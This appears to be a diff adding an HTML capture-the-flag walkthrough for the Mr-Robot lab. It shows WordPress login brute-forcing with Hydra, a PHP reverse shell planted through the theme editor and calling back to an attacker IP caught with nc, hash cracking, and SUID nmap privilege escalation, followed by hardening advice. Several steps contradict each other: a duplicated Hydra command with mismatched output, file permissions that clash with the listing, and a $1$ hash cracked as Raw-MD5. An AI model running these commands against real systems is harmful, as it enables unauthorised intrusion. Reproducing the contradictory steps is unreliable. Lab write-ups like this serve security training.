@@ -1,0 +1,509 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mr. Robot CTF Walkthrough</title>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;600&display=swap">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&display=swap">
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body class="bg-black text-green-400 font-mono">
+    <!-- Status Bar -->
+    <div class="status-bar">
+        <div class="left">
+            <span class="indicator"></span>
+            <span>kali@kali</span>
+            <span class="stats">CPU: 25% | RAM: 1.6GB/16GB</span>
+        </div>
+        <div class="right">
+            <span>Wed 19 Mar - 03:39</span>
+        </div>
+    </div>
+    <!-- Navigation Bar -->
+    <nav id="navbar" class="fixed top-0 left-0 w-full bg-black bg-opacity-80 z-50 border-b border-green-500">
+        <div class="container mx-auto px-4 py-3">
+            <div class="flex justify-between items-center">
+                <div class="text-xl font-bold glitch-text" data-text="Mr. Robot CTF">Mr. Robot <span class="text-red-500">CTF</span></div>
+                <ul class="flex space-x-6">
+                    <li><a href="#setup" class="nav-link">Lab Setup</a></li>
+                    <li><a href="#enumeration" class="nav-link">External Enumeration</a></li>
+                    <li><a href="#web" class="nav-link">Web Enumeration</a></li>
+                    <li><a href="#wordpress" class="nav-link">WordPress Exploitation</a></li>
+                    <li><a href="#privilege" class="nav-link">Initial Shell</a></li>
+                    <li><a href="#lateral" class="nav-link">Lateral Movement</a></li>
+                    <li><a href="#privesc" class="nav-link">Privilege Escalation</a></li>
+                    <li><a href="#flags" class="nav-link">Flags</a></li>
+                    <li><a href="#post-exploit" class="nav-link">Hardening</a></li>
+                    <li><a href="#lessons" class="nav-link">Lessons</a></li>
+                </ul>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Header Section -->
+    <header class="h-screen flex items-center justify-center relative overflow-hidden">
+        <div class="absolute inset-0 terminal-background"></div>
+        <div class="container mx-auto px-4 text-center z-10">
+            <h1 class="text-5xl font-bold mb-4 glitch-text" data-text="Mr-Robot">Mr-Robot <span class="text-cyan-400">(TryHackMe / VulnHub)</span></h1>
+            <div class="mb-6 text-xl terminal-text">
+                <p>Author: <span class="text-cyan-400">Liam Johnson</span></p>
+                <p>Difficulty: <span class="text-cyan-400">Beginner → Intermediate</span></p>
+                <p>Flags: <span class="text-cyan-400">3</span> (key-1-of-3, key-2-of-3, key-3-of-3)</p>
+            </div>
+            <div class="mt-10">
+                <a href="#setup" class="btn-primary">Start Walkthrough</a>
+            </div>
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <main>
+        <!-- Lab Setup Section -->
+        <section id="setup" class="section">
+            <div class="container mx-auto px-4">
+                <h2 class="section-title">0. Lab set-up</h2>
+                <div class="content-block">
+                    <ul class="list-disc pl-6 mb-4 space-y-2">
+                        <li>Join the room and connect to the THM OpenVPN.</li>
+                        <li>Deploy the VM and note its IP – here I'll refer to it as <span class="text-cyan-400">$RHOST</span>.</li>
+                        <li>Create a working directory:</li>
+                    </ul>
+                    <div class="code-block">
+                        <pre><code class="language-bash">mkdir -p ~/thm/mrrobot/{scans,loot,exploits}
+cd ~/thm/mrrobot</code></pre>
+                        <button class="copy-btn" data-clipboard-target="#code1">Copy</button>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- External Enumeration Section -->
+        <section id="enumeration" class="section">
+            <div class="container mx-auto px-4">
+                <h2 class="section-title">1. External enumeration</h2>
+                <div class="content-block">
+                    <h3 class="text-xl font-bold mb-3 text-cyan-400">1.1 Nmap</h3>
+                    <div class="code-block">
+                        <pre><code class="language-bash">sudo nmap -sC -sV -oA scans/initial $RHOST</code></pre>
+                        <button class="copy-btn" data-clipboard-target="#code2">Copy</button>
+                    </div>
+                    <h4 class="text-lg font-bold mt-4 mb-2">Result</h4>
+                    <div class="code-block">
+                        <pre><code>PORT   STATE SERVICE VERSION
+22/tcp closed ssh
+80/tcp open  http    Apache httpd 2.4.7
+443/tcp open  https   Apache httpd 2.4.7 (SSL)</code></pre>
+                    </div>
+                    <p class="mt-4">Only the web stack looks promising ⇒ browse it.</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- Web Enumeration Section -->
+        <section id="web" class="section">
+            <div class="container mx-auto px-4">
+                <h2 class="section-title">2. Web enumeration</h2>
+                <div class="content-block">
+                    <h3 class="text-xl font-bold mb-3 text-cyan-400">2.1 First look</h3>
+                    <p>Visiting <code>http://$RHOST</code> presents a flashy Mr-Robot themed page with a mock terminal.</p>
+                    <div class="screenshot-container mt-4 mb-6">
+                        <div class="screenshot" data-modal="screenshot1">
+                            <img src="robots.txt.jpg" alt="robots.txt file" class="w-full h-full object-cover">
+                            <div class="screenshot-label">robots.txt Discovery</div>
+                        </div>
+                        <div class="screenshot" data-modal="screenshot2">
+                            <img src="key-1-of-3.txt.jpg" alt="First flag" class="w-full h-full object-cover">
+                            <div class="screenshot-label">First Flag Found</div>
+                        </div>
+                    </div>
+
+                    <h3 class="text-xl font-bold mb-3 text-cyan-400">2.2 robots.txt</h3>
+                    <p>Classic low-hanging fruit:</p>
+                    <div class="code-block">
+                        <pre><code>http://$RHOST/robots.txt</code></pre>
+                    </div>
+                    <p class="mt-2">Content:</p>
+                    <div class="code-block">
+                        <pre><code>User-agent: *
+fsocity.dic
+key-1-of-3.txt</code></pre>
+                    </div>
+                    <ul class="list-disc pl-6 mt-4 mb-4 space-y-2">
+                        <li><span class="text-cyan-400">key-1-of-3.txt</span> → <span class="flag-found">FIRST FLAG ✔</span></li>
+                        <li><span class="text-cyan-400">fsocity.dic</span> → 858,000-line wordlist → save it:</li>
+                    </ul>
+                    <div class="code-block">
+                        <pre><code class="language-bash">wget http://$RHOST/fsocity.dic -P loot/
+sort -u loot/fsocity.dic -o loot/fsocity.dic   # remove dups</code></pre>
+                        <button class="copy-btn" data-clipboard-target="#code3">Copy</button>
+                    </div>
+
+                    <h3 class="text-xl font-bold mt-6 mb-3 text-cyan-400">2.3 Content discovery</h3>
+                    <p>Use Dirsearch:</p>
+                    <div class="code-block">
+                        <pre><code class="language-bash">dirsearch -u https://192.168.1.4/ -e xml,json,sql,db,log,yaml,bak,tar.gz,zip -x 403,404,500,400,502,503,429 --random-agent</code></pre>
+                        <button class="copy-btn" data-clipboard-target="#code4">Copy</button>
+                    </div>
+                    <p class="mt-2">Interesting hits:</p>
+                    <div class="code-block">
+                        <pre><code>/wp-login.php
+/sitemap.xml</code></pre>
+                    </div>
+                    <div class="screenshot-container mt-4 mb-6">
+                        <div class="screenshot" data-modal="screenshot3">
+                            <img src="dir search 1.jpg" alt="Directory search results 1" class="w-full h-full object-cover">
+                            <div class="screenshot-label">Dirsearch Results 1</div>
+                        </div>
+                        <div class="screenshot" data-modal="screenshot4">
+                            <img src="dir search 2.jpg" alt="Directory search results 2" class="w-full h-full object-cover">
+                            <div class="screenshot-label">Dirsearch Results 2</div>
+                        </div>
+                    </div>
+                    <p class="mt-4">The target runs WordPress ⇒ time for credential harvesting.</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- WordPress Exploitation Section -->
+        <section id="wordpress" class="section">
+            <div class="container mx-auto px-4">
+                <h2 class="section-title">3. WordPress – credential brute-force</h2>
+                <div class="challenge-card">
+                    <h3>WordPress Login Bypass</h3>
+                    <div class="difficulty">Medium</div>
+                    <p>Exploit WordPress login form to gain admin access using the fsocity.dic wordlist.</p>
+                </div>
+                <div class="content-block">
+                    <h3 class="text-xl font-bold mb-3 text-cyan-400">3.1 Username enumeration</h3>
+                    <p>WordPress discloses different error messages for bad-user vs bad-pass. Exploit this with Hydra.</p>
+                    <p class="mt-2">Capture one failed POST with Burp to learn the field names (<code>log</code>, <code>pwd</code>).</p>
+                    <div class="screenshot-container mt-4 mb-6">
+                        <div class="screenshot" data-modal="screenshot5">
+                            <img src="wp-login.jpg" alt="WordPress login page" class="w-full h-full object-cover">
+                            <div class="screenshot-label">WordPress Login Page</div>
+                        </div>
+                        <div class="screenshot" data-modal="screenshot6">
+                            <img src="wps scan 1.jpg" alt="WordPress scan results" class="w-full h-full object-cover">
+                            <div class="screenshot-label">WordPress Scan Results</div>
+                        </div>
+                    </div>
+                    <div class="code-block">
+                        <pre><code class="language-bash">hydra -L fsocity.dic -p mrrobot 192.168.1.4 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username" -t 30</code></pre>
+                        <button class="copy-btn" data-clipboard-target="#code5">Copy</button>
+                    </div>
+                    <p class="mt-2">After a minute Hydra returns:</p>
+                    <div class="code-block">
+                        <pre><code>[80][http-post-form] host: 192.168.1.4 login: Elliot password: mrrobot</code></pre>
+                    </div>
+                    <p class="mt-4">So the valid username is <code>elliot</code>.</p>
+
+                    <h3 class="text-xl font-bold mt-6 mb-3 text-cyan-400">3.2 Password brute-force</h3>
+                    <div class="code-block">
+                        <pre><code class="language-bash">hydra -L fsocity.dic -p mrrobot 192.168.1.4 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username" -t 30</code></pre>
+                        <button class="copy-btn" data-clipboard-target="#code6">Copy</button>
+                    </div>
+                    <p class="mt-2">Hydra finds:</p>
+                    <div class="code-block">
+                        <pre><code>elliot : ER28-0652</code></pre>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Initial Shell Section -->
+        <section id="privilege" class="section">
+            <div class="container mx-auto px-4">
+                <h2 class="section-title">4. Initial shell (www-data → daemon)</h2>
+                <div class="content-block">
+                    <h3 class="text-xl font-bold mb-3 text-cyan-400">4.1 WordPress theme editor abuse</h3>
+                    <p>Log in to <code>/wp-admin/</code> with Elliot's creds.</p>
+                    <p>Appearance → Editor → Select <code>404.php</code> or <code>archive.php</code>, replace its contents with a PHP reverse shell.</p>
+                    <p class="mt-2">Easiest: pen-test-monkey template.</p>
+                    <p class="mt-2">Edit the two variables:</p>
+                    <div class="code-block">
+                        <pre><code class="language-php">$ip   = "192.168.1.5";
+$port = 53;                // DNS egress rarely filtered</code></pre>
+                        <button class="copy-btn" data-clipboard-target="#code7">Copy</button>
+                    </div>
+                    <p class="mt-2">Save.</p>
+                    
+                    <div class="screenshot-container mt-4 mb-6">
+                        <div class="screenshot" data-modal="screenshot6">
+                            <img src="WordPress theme editor.jpg" alt="WordPress theme editor" class="w-full h-full object-cover">
+                            <div class="screenshot-label">WordPress Theme Editor</div>
+                        </div>
+                        <div class="screenshot" data-modal="screenshot7">
+                            <img src="archive.php.jpg" alt="Editing archive.php" class="w-full h-full object-cover">
+                            <div class="screenshot-label">Editing archive.php</div>
+                        </div>
+                        <div class="screenshot" data-modal="screenshot8">
+                            <img src="php revers shell.jpg" alt="PHP reverse shell code" class="w-full h-full object-cover">
+                            <div class="screenshot-label">PHP Reverse Shell Code</div>
+                        </div>
+                    </div>
+
+                    <h3 class="text-xl font-bold mt-6 mb-3 text-cyan-400">4.2 Catch shell</h3>
+                    <div class="code-block">
+                        <pre><code class="language-bash">rlwrap nc -lvnp 53
+# visit http://$RHOST/wp-content/themes/twentyfifteen/archive.php</code></pre>
+                        <button class="copy-btn" data-clipboard-target="#code8">Copy</button>
+                    </div>
+                    <p class="mt-2">Shell lands:</p>
+                    <div class="code-block">
+                        <pre><code>connection from $RHOST accepted
+id
+uid=1(daemon) gid=1(daemon) groups=1(daemon)</code></pre>
+                    </div>
+                    <p class="mt-2">Upgrade TTY:</p>
+                    <div class="code-block">
+                        <pre><code class="language-bash">python -c 'import pty,os; pty.spawn("/bin/bash")'
+CTRL-Z
+stty raw -echo; fg
+export TERM=xterm</code></pre>
+                        <button class="copy-btn" data-clipboard-target="#code9">Copy</button>
+                    </div>
+                    
+                    <div class="screenshot-container mt-4 mb-6">
+                        <div class="screenshot" data-modal="screenshot9">
+                            <img src="catch shell.jpg" alt="Catching the reverse shell" class="w-full h-full object-cover">
+                            <div class="screenshot-label">Catching the Reverse Shell</div>
+                        </div>
+                        <div class="screenshot" data-modal="screenshot10">
+                            <img src="rlwrap.jpg" alt="Using rlwrap for better shell" class="w-full h-full object-cover">
+                            <div class="screenshot-label">Upgrading Shell with rlwrap</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Lateral Move Section -->
+        <section id="lateral" class="section">
+            <div class="container mx-auto px-4">
+                <h2 class="section-title">5. Lateral move – become "robot"</h2>
+                <div class="content-block">
+                    <h3 class="text-xl font-bold mb-3 text-cyan-400">5.1 Explore /home</h3>
+                    <div class="code-block">
+                        <pre><code class="language-bash">ls -l /home
+drwxr-xr-x 2 robot robot 4096 Jun 17  2016 robot</code></pre>
+                        <button class="copy-btn" data-clipboard-target="#code10">Copy</button>
+                    </div>
+                    <p class="mt-2">Inside:</p>
+                    <div class="code-block">
+                        <pre><code class="language-bash">cd /home/robot
+ls -la
+-rw-r--r-- 1 robot robot  33 Jun 17  2016 key-2-of-3.txt
+-rw-r----- 1 robot robot 236 Jun 17  2016 password.raw-md5</code></pre>
+                        <button class="copy-btn" data-clipboard-target="#code11">Copy</button>
+                    </div>
+                    <p class="mt-2">We can read the hash file but not the second flag (permissions 600).</p>
+
+                    <h3 class="text-xl font-bold mt-6 mb-3 text-cyan-400">5.2 Crack the Hash</h3>
+                    <div class="code-block">
+                        <pre><code class="language-bash">cat password.raw-md5
+# robot:$1$albatro$fc1a...b927   (example truncated)
+
+echo 'fc1a...b927' > loot/md5.hash         # strip leading user: if present
+john --wordlist=loot/fsocity.dic --format=Raw-MD5 loot/md5.hash</code></pre>
+                        <button class="copy-btn" data-clipboard-target="#code12">Copy</button>
+                    </div>
+                    <p class="mt-2">Output:</p>
+                    <div class="code-block">
+                        <pre><code>abcdefghijklmnopqrstuvwxyz  (robot)</code></pre>
+                    </div>
+
+                    <h3 class="text-xl font-bold mt-6 mb-3 text-cyan-400">5.3 Switch User</h3>
+                    <div class="code-block">
+                        <pre><code class="language-bash">su robot
+# enter abcdefghijklmnopqrstuvwxyz
+whoami
+robot
+cat key-2-of-3.txt              # FLAG 2</code></pre>
+                        <button class="copy-btn" data-clipboard-target="#code13">Copy</button>
+                    </div>
+                    
+                    <div class="screenshot-container mt-4 mb-6">
+                        <div class="screenshot" data-modal="screenshot11">
+                            <img src="cat password.raw-md5.jpg" alt="Viewing password hash" class="w-full h-full object-cover">
+                            <div class="screenshot-label">Viewing MD5 Password Hash</div>
+                        </div>
+                        <div class="screenshot" data-modal="screenshot12">
+                            <img src="crack the hash.jpg" alt="Cracking the hash" class="w-full h-full object-cover">
+                            <div class="screenshot-label">Cracking the Hash</div>
+                        </div>
+                        <div class="screenshot" data-modal="screenshot13">
+                            <img src="key-2-of-3.txt.jpg" alt="Second flag" class="w-full h-full object-cover">
+                            <div class="screenshot-label">Second Flag Found</div>
+                        </div>
+                    </div>
+                    
+                    <p class="mt-2">We now need root.</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- Privilege Escalation Section -->
+        <section id="privesc" class="section">
+            <div class="container mx-auto px-4">
+                <h2 class="section-title">6. Privilege escalation – robot → root</h2>
+                <div class="content-block">
+                    <h3 class="text-xl font-bold mb-3 text-cyan-400">6.1 Find SUID Binaries</h3>
+                    <div class="code-block">
+                        <pre><code class="language-bash">find / -perm -4000 -type f -exec ls -l {} \; 2>/dev/null | tee loot/suid.txt</code></pre>
+                        <button class="copy-btn" data-clipboard-target="#code14">Copy</button>
+                    </div>
+                    
+                    <p class="mt-2">Among usual suspects appears:</p>
+                    <div class="code-block">
+                        <pre><code>-rwsr-xr-x 1 root root 489776 Jan 11  2016 /usr/local/bin/nmap</code></pre>
+                    </div>
+                    <p class="mt-2">A custom copy of nmap carrying the SUID bit – juicy.</p>
+
+                    <h3 class="text-xl font-bold mt-6 mb-3 text-cyan-400">6.2 GTFOBins Technique</h3>
+                    <p>Consult <a href="https://gtfobins.github.io/gtfobins/nmap/" class="text-cyan-400 underline" target="_blank">GTFOBins for nmap</a> → SUID section.</p>
+                    <p class="mt-2">If interactive mode exists we can execute <code>!sh</code> as root.</p>
+                    <div class="code-block">
+                        <pre><code class="language-bash">/usr/local/bin/nmap --interactive
+nmap> !sh
+# id
+uid=0(root) gid=0(root) groups=0(root)</code></pre>
+                        <button class="copy-btn" data-clipboard-target="#code15">Copy</button>
+                    </div>
+                    <p class="mt-2">We are root!</p>
+                    <p class="mt-2">Grab final flag:</p>
+                    <div class="code-block">
+                        <pre><code class="language-bash">cat /root/key-3-of-3.txt        # FLAG 3</code></pre>
+                        <button class="copy-btn" data-clipboard-target="#code16">Copy</button>
+                    </div>
+                    
+                    <div class="screenshot-container mt-4 mb-6">
+                        <div class="screenshot" data-modal="screenshot14">
+                            <img src="root.jpg" alt="Root access" class="w-full h-full object-cover">
+                            <div class="screenshot-label">Root Access Achieved</div>
+                        </div>
+                        <div class="screenshot" data-modal="screenshot15">
+                            <img src="key-3-of-3.txt.jpg" alt="Third flag" class="w-full h-full object-cover">
+                            <div class="screenshot-label">Third Flag Found</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Flags Recap Section -->
+        <section id="flags" class="section">
+            <div class="container mx-auto px-4">
+                <h2 class="section-title">7. Flags recap</h2>
+                <div class="content-block">
+                    <ul class="list-disc pl-6 mb-4 space-y-2">
+                        <li><span class="text-highlight-color">key-1-of-3.txt</span> – robots.txt reference <span class="flag-found">✓</span></li>
+                        <li><span class="text-highlight-color">key-2-of-3.txt</span> – readable as 'robot' after hash crack <span class="flag-found">✓</span></li>
+                        <li><span class="text-highlight-color">key-3-of-3.txt</span> – accessible as root via SUID nmap <span class="flag-found">✓</span></li>
+                    </ul>
+                </div>
+            </div>
+        </section>
+
+        <!-- Post-Exploit Notes Section -->
+        <section id="post-exploit" class="section">
+            <div class="container mx-auto px-4">
+                <h2 class="section-title">8. Post-exploit notes & hardening</h2>
+                <div class="content-block">
+                    <div class="overflow-x-auto">
+                        <table class="w-full border-collapse">
+                            <thead>
+                                <tr class="border-b border-cyan-400">
+                                    <th class="py-2 px-4 text-left text-cyan-400">Issue</th>
+                                    <th class="py-2 px-4 text-left text-cyan-400">Mitigation</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr class="border-b border-gray-700">
+                                    <td class="py-2 px-4">robots.txt exposing sensitive files</td>
+                                    <td class="py-2 px-4">Do not list secret paths; security by design, not by obscurity.</td>
+                                </tr>
+                                <tr class="border-b border-gray-700">
+                                    <td class="py-2 px-4">WordPress verbose login errors</td>
+                                    <td class="py-2 px-4">Generic message for failed auth; enable rate-limit, ReCAPTCHA.</td>
+                                </tr>
+                                <tr class="border-b border-gray-700">
+                                    <td class="py-2 px-4">Weak credential policy</td>
+                                    <td class="py-2 px-4">Enforce complexity & MFA; limit login attempts.</td>
+                                </tr>
+                                <tr class="border-b border-gray-700">
+                                    <td class="py-2 px-4">Theme editor RCE</td>
+                                    <td class="py-2 px-4">Disable file-editor or limit to trusted roles; use WAF.</td>
+                                </tr>
+                                <tr class="border-b border-gray-700">
+                                    <td class="py-2 px-4">Plain/hashed password backup file</td>
+                                    <td class="py-2 px-4">Never store credentials in web-root or world-readable paths.</td>
+                                </tr>
+                                <tr class="border-b border-gray-700">
+                                    <td class="py-2 px-4">SUID nmap binary</td>
+                                    <td class="py-2 px-4">Remove SUID bit; keep only required elevated binaries.</td>
+                                </tr>
+                                <tr class="border-b border-gray-700">
+                                    <td class="py-2 px-4">Outbound firewall egress</td>
+                                    <td class="py-2 px-4">Restrict outgoing DNS/HTTP from web-user to prevent reverse shells.</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Lessons Learned Section -->
+        <section id="lessons" class="section">
+            <div class="container mx-auto px-4">
+                <h2 class="section-title">Lessons Learned</h2>
+                <div class="content-block">
+                    <ul class="list-disc pl-6 mb-4 space-y-2">
+                        <li>Always check robots.txt for sensitive information disclosure</li>
+                        <li>WordPress sites are vulnerable to username enumeration attacks</li>
+                        <li>Theme editor functionality can be abused for code execution</li>
+                        <li>Proper file permission management is critical for security</li>
+                        <li>SUID binaries can be exploited for privilege escalation</li>
+                        <li>Password hashes should never be stored in readable locations</li>
+                    </ul>
+                    <div class="mt-6 text-center">
+                        <p class="text-xl">Happy Hacking!</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <!-- Footer -->
+    <footer class="bg-gray-900 text-center py-6 border-t border-green-500">
+        <div class="container mx-auto px-4">
+            <p>Mr. Robot CTF Walkthrough | Created by Liam Johnson</p>
+            <div class="mt-4">
+                <button id="theme-toggle" class="btn-secondary">Toggle Theme</button>
+                <button id="download-pdf" class="btn-secondary ml-4">Download PDF</button>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Screenshot Modal -->
+    <div id="screenshot-modal" class="fixed inset-0 bg-black bg-opacity-90 flex items-center justify-center z-50 hidden">
+        <div class="modal-content relative bg-gray-900 border border-green-500 max-w-4xl w-full mx-4">
+            <div class="modal-header border-b border-green-500 p-4 flex justify-between items-center">
+                <h3 id="modal-caption" class="text-cyan-400 text-xl">Screenshot Viewer</h3>
+                <button class="close-modal text-2xl text-red-500 hover:text-red-400">&times;</button>
+            </div>
+            <div class="modal-body p-4">
+                <img id="modal-image" src="" alt="Screenshot" class="max-w-full max-h-[70vh] mx-auto">
+            </div>
+        </div>
+    </div>
+
+    <!-- Scripts -->
+    <script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/prismjs@1.24.1/prism.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js"></script>
+    <script src="script.js"></script>
+</body>
+</html>
